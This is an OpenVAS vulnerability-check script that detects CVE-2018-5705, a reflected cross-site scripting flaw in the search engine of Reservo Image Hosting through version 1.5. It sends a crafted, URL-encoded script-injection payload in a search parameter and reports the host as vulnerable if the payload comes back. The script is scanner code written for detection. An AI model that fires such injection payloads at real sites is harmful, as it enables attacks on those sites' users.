###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_reservo_image_hosting_xss_vuln.nasl 8459 2018-01-18 11:13:27Z jschulte $
#
# Reservo Image Hosting XSS Vulnerability
#
# Authors:
# Jan Philipp Schulte <jan.schulte@greenbone.net>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, https://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if( description )
{
  script_oid("1.3.6.1.4.1.25623.1.0.113086");
  script_version("$Revision: 8459 $");
  script_tag(name:"last_modification", value:"$Date: 2018-01-18 12:13:27 +0100 (Thu, 18 Jan 2018) $");
  script_tag(name:"creation_date", value:"2018-01-18 10:46:47 +0100 (Thu, 18 Jan 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:P/A:N");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2018-5705");

  script_name("Reservo Image Hosting XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Reservo Image Hosting Scripts through 1.5 is vulnerable to an XSS attack.");
  script_tag(name:"vuldetect", value:"The script sends a specifically crafted package to the host and tries to exploit the XSS vulnerability.");
  script_tag(name:"insight", value:"The flaw exists within the software's search engine.");
  script_tag(name:"impact", value:"Successful exploitation would allow an attacker to trick other users to execute malicious code in their context.");
  script_tag(name:"affected", value:"Reservo Image Hosting Scripts through version 1.5");
  script_tag(name:"solution", value:"Update to Reservoce Image Hosting Scripts version 1.6.1 or above.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43676/");
  script_xref(name:"URL", value:"https://reservo.co/");

  exit( 0 );
}

include( "host_details.inc" );
include( "http_func.inc" );
include( "http_keepalive.inc" );

port = get_http_port( default: 80 );

buf = http_get_cache( item: "/", port: port );


if( "themes/reservo/frontend" >< buf ) {
  timestamp = gettimeofday();
  exploit_url = "/search/?s=image&t=%27%29%3B%2522%2520style%253D%22%3Cscript%3Ealert%28" + timestamp + "%29%3C%2Fscript%3E%3C";
  req = http_get( port: port, item: exploit_url );
  resp = http_keepalive_send_recv( port: port, data: req );
  if( resp =~ 'loadBrowsePageRecentImages\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' || resp =~ 'loadBrowsePageAlbums\\(.+\\);%22%20style%3D<script>alert\\(' + timestamp + '\\)</script>' ) {
    report = "The script was able to exploit the XSS vulnerability on the target host.";
    security_message( port: port, data: report );
  }
  else {
    exit( 99 );
  }
}

exit( 0 );
